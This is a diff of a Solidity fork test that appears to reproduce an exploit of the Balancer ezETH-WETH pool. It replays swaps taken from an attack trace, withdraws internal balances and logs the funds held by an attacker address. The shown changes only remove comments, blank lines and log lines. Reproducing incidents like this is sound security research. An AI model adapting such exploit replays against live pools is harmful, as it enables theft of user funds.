@@ -48,7 +48,6 @@ interface IBalancerVault {
         );
 
     function manageUserBalance(UserBalanceOp[] memory ops) external payable;
-
     function getInternalBalance(address user, IERC20[] memory tokens)
         external view
         returns (uint256[] memory balances);
@@ -70,12 +69,9 @@ interface IWETH is IERC20 {
 contract BalancerEzEthWethPoolTest is Test {
     IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-
-    // Pool: ezETH-WETH (Ethereum)
     bytes32 constant POOL_ID_EZETH = 0x596192bb6e41802428ac943d2f1476c1af25cc0e000000000000000000000659;
     address constant ezETH_WETH_BPT = 0x596192bB6e41802428Ac943D2f1476C1Af25CC0E;
     address constant ezETH = 0xbf5495Efe5DB9ce00f80364C8B423567e58d2110;
-
     address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);
 
     struct ExactSwapData {
@@ -93,9 +89,7 @@ contract BalancerEzEthWethPoolTest is Test {
             23717101
         );
 
-        console.log("=== EZETH/WETH POOL TEST ===");
         console.log("Pool: ezETH-WETH (0x596192bb6e41802428ac943d2f1476c1af25cc0e000000000000000000000659)");
-
         (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_EZETH);
 
         console.log("INITIAL STATE:");
@@ -118,7 +112,7 @@ contract BalancerEzEthWethPoolTest is Test {
             toInternalBalance: true
         });
 
-        // Exact swaps from transaction trace
+        // swaps from transaction trace
         ExactSwapData[90] memory swaps;
 
         swaps[0] = ExactSwapData({
@@ -955,8 +949,6 @@ contract BalancerEzEthWethPoolTest is Test {
         console.log("Swaps executed:", successCount, "/", swaps.length);
 
         // Withdrawal via manageUserBalance
-        console.log("=== WITHDRAWAL manageUserBalance() ===");
-
         IERC20[] memory internalTokens = new IERC20[](3);
         internalTokens[0] = IERC20(ezETH_WETH_BPT);
         internalTokens[1] = IERC20(ezETH);
@@ -1026,7 +1018,7 @@ contract BalancerEzEthWethPoolTest is Test {
         console.log("ezETH:", IERC20(ezETH).balanceOf(ATTACKER) / 1e18, "ETH");
         console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
 
-        console.log("Total swaps executed:", successCount);
+        console.log("Total swaps:", successCount);
         console.log("SUCCESS!");
     }
 
